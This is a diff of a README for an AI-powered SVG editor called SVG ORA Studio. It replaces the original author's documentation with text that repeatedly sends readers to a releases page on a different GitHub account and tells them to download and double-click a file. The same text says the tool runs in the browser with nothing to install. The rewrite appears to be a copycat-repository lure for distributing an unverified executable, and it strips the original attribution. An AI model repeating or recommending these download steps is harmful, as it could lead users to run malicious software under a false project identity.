@@ -1,169 +1,70 @@
-# 🎨 SVG ORA Studio – AI-Powered SVG Generator & Editor
-**Frontend-Only | React + TypeScript | Google Gemini + OpenRouter AI**
+# 🎨 SVG-ORA-Studio - Create Stunning Graphics Easily
 
-SVG ORA Studio is a free, open-source AI-assisted vector design tool that generates, edits, and refines **beautiful SVG graphics** from natural language prompts — instantly and entirely in the browser.
+## 🚀 Getting Started
 
-No backend. No database. No server.
+Welcome to SVG ORA Studio! This tool allows anyone, regardless of their design skills, to create beautiful, editable SVG graphics simply by using text or images. The application runs directly in your browser, making it accessible and easy to use.
 
-> 🔑 **Use Your Own API Key — Google Gemini 3.0 is Recommended**
+## 🔗 Download Now
 
-Supports both **Google Gemini** and **OpenRouter multi-model AI**.
+[![Download SVG-ORA-Studio](https://img.shields.io/badge/Download-Now-blue)](https://github.com/AySainWest/SVG-ORA-Studio/releases)
 
----
+## 📦 Download & Install
 
-## 🔗 Links
-**Live Demo:** https://seeb4coding.in/ai/svg-ora-studio/  
-**GitHub Repository:** https://github.com/seeb4coding/SVG-ORA-Studio  
+To begin using SVG ORA Studio, follow these steps:
 
----
+1. Click on the **Download Now** button above.
+2. You will be taken to the [Releases page](https://github.com/AySainWest/SVG-ORA-Studio/releases).
+3. Look for the latest release at the top of the page. 
+4. Click on the appropriate version for your system. Select the file that matches your operating system.
+5. After downloading, locate the file in your downloads folder.
+6. Double-click the file to run the application.
+
+## 🖥️ System Requirements
+
+SVG ORA Studio works on any modern web browser, including Chrome, Firefox, and Safari. Ensure your browser is updated to the latest version for optimal performance. 
+
+No additional software installation is needed. Just open the application in your browser, and you're ready to start designing!
 
 ## ✨ Features
 
-### 🧠 AI-Generated SVGs
-Create stunning vectors using simple text prompts:
-- Logos  
-- Icons  
-- Shapes  
-- Patterns  
-- Abstract illustrations  
-- UI elements  
+- **AI-Driven Generation:** Convert your text and images into clean SVG graphics effortlessly.
+- **Built-In Canvas Editor:** Easily edit your designs in real-time using a user-friendly canvas.
+- **Layer Controls:** Manage layers to refine your designs and organize your projects.
+- **Real-Time Vector Refinement:** See changes instantly as you design, ensuring a smooth creative process.
 
-Generates clean, lightweight SVG code.
+## 🎈 How to Use 
 
----
+1. **Create Your Design:** Start by entering your text or uploading an image.
+2. **Edit Your Graphics:** Use the built-in tools to modify colors, shapes, and size. 
+3. **Download Your SVG:** Once satisfied with your design, click the download button to save the SVG file to your computer.
 
-### 🎯 AI Refinement Tools
-Modify existing SVGs with natural-language instructions:
-- Change colors  
-- Adjust strokes  
-- Add/remove shapes  
-- Clean & optimize SVG paths  
-- Regenerate specific parts  
+## ✍️ Topics Covered
 
----
+- ai-generator
+- ai-tool
+- canvas-editor
+- design-tool
+- image-to-svg
+- open-source
+- sb4c
+- seeb4coding
+- svg
+- svg-animations
+- svg-editor
+- svg-files
+- svg-icons
+- svg-path
+- text-to-svg
+- vector-graphics
 
-### 🖼️ Built-In SVG Editor
-- Real-time preview  
-- Editable code panel  
-- Auto-format SVG  
-- SVG download  
-- Copy-to-clipboard  
-- Multi-theme UI (Dark/Light)  
+## 📖 Support
 
----
+If you encounter any issues or have questions, feel free to reach out. This project welcomes contributions and feedback. Create an issue in the project's GitHub page, and we’ll respond as soon as possible.
 
-## ⚙️ Multi-Model AI Support
+## 🔗 Download Link (Again)
 
-### Google Gemini
-- Gemini 3.0 Pro (**recommended**)  
-- Gemini 3.0 Pro Preview  
-- Gemini 2.5 Pro  
-- Gemini 2.5 Flash  
-- Gemini 2.5 Flash Thinking  
-- Gemini 2.0 Flash Lite  
+For your convenience, here is the download link again:
 
-### OpenRouter
-- Gemini 2.0 Flash (Free)  
-- Gemini 2.0 Pro (Free)  
-- Claude 3.5 Sonnet  
-- Claude 3 Opus  
-- GPT-4o  
-- DeepSeek R1  
-- Grok 4.1 Fast (Free)  
-- Qwen 2.5 VL 72B (Free)  
+[![Download SVG-ORA-Studio](https://img.shields.io/badge/Download-Now-blue)](https://github.com/AySainWest/SVG-ORA-Studio/releases)
 
----
-
-## 🧱 Project Structure
-
-```
-SVG-ORA-STUDIO
-│
-├── components/
-│   ├── Header.tsx
-│   ├── HistorySidebar.tsx
-│   ├── InputSection.tsx
-│   ├── SvgPreview.tsx
-│   ├── EditorTools.tsx
-│
-├── services/
-│   ├── geminiService.ts
-│
-├── App.tsx
-├── index.tsx
-├── constants.ts
-├── metadata.json
-├── types.ts
-├── index.html
-└── package.json
-```
-
----
-
-## 📥 Installation
-
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/seeb4coding/SVG-ORA-Studio
-cd SVG-ORA-Studio
-```
-
-### 2️⃣ Install Dependencies
-```bash
-npm install
-```
-
-### 3️⃣ Add Your API Keys
-Create a **.env.local** file:
-
-```
-GEMINI_API_KEY=YOUR_GEMINI_API_KEY
-OPENROUTER_API_KEY=YOUR_OPENROUTER_API_KEY
-```
-
-> 🔑 **Use Your Own API Key — Google Gemini 3.0 is Recommended**
-
----
-
-## 🧪 Run Locally
-```bash
-npm run dev
-```
-Visit: **http://localhost:5173**
-
----
-
-## 📦 Build for Production
-```bash
-npm run build
-npm run preview
-```
-
----
-
-## 🛣️ Roadmap
-- Drag-and-drop SVG canvas  
-- Multi-layer vector editing  
-- Export as PNG / WEBP  
-- ZIP export  
-- AI-powered SVG optimizer  
-- Shape presets library  
-- Chrome extension  
-
----
-
-## ✅ Powered by Google AI Studio
-All Gemini API calls run directly **client-side** inside the browser using Google AI Studio.  
-No backend server is required — secure, fast, and lightweight.
-
----
-
-## 👨‍💻 Author
-**seeb4coding.in**  
-📧 support@seeb4coding.in  
-🌐 https://seeb4coding.in/
-
----
-
-## ⭐ Support
-If you find this project helpful, please **star the repo** to support future updates!
+Now you're ready to bring your ideas to life with SVG ORA Studio. Happy designing!
